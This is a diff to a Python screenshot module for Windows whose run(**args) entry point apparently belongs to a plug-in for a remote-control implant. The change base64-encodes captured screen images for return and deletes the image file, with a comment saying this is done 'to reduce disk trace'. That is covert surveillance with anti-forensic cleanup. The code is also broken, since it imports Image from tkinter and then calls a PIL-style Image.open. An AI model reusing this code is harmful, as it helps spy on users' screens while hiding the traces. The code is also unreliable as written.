@@ -1,4 +1,7 @@
 import base64
+import io
+import os
+from tkinter import Image
 import win32api
 import win32gui
 import win32ui
@@ -33,5 +36,17 @@ def screenshot(name = 'screenshot'):
 def run(**args):
     screenshot()
     with open('screenshot.bmp', 'rb') as f:
-        img = f.read()
-    return img
+        bmp_data = f.read()
+
+    img = Image.open(io.BytesIO(bmp_data))
+    buffer = io.BytesIO()
+    img.save(buffer, format='PNG')
+    png_data = buffer.getvalue()
+
+    # Step 2: Base64 encode the PNG data
+    encoded_data = base64.b64encode(png_data).decode()
+
+    # Optional: cleanup BMP file to reduce disk trace
+    os.remove('screenshot.bmp')
+    
+    return encoded_data
